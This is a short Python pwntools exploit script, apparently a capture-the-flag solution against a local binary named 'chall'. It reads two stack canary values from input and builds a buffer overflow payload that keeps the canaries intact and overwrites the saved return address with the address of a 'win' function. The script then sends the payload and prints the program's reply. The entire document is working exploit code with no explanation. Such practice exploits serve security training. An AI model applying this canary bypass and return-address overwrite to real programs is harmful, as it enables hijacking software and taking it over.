import pwn
import sys

elf = pwn.ELF('./chall')
io = elf.process()

print(io.recv().decode("utf-8"))
print(elf.symbols["win"])
zeros = int("0000",16)
zeros = pwn.p32(zeros)
canary1 = input()
canary1 = int(canary1 , 16)
canary1 = pwn.p32(canary1)
canary2 = input()
canary2 = int(canary2 , 16)
canary2 = pwn.p32(canary2)
new_eip = pwn.p32(elf.symbols["win"])
payload = b"".join(
    [
        b"0" * 24,
        canary2,
        canary1,
        b"A" * 8,
        new_eip,
        zeros
    ]
)
io.sendline(payload)
print(io.recv(1000000).decode("utf-8"))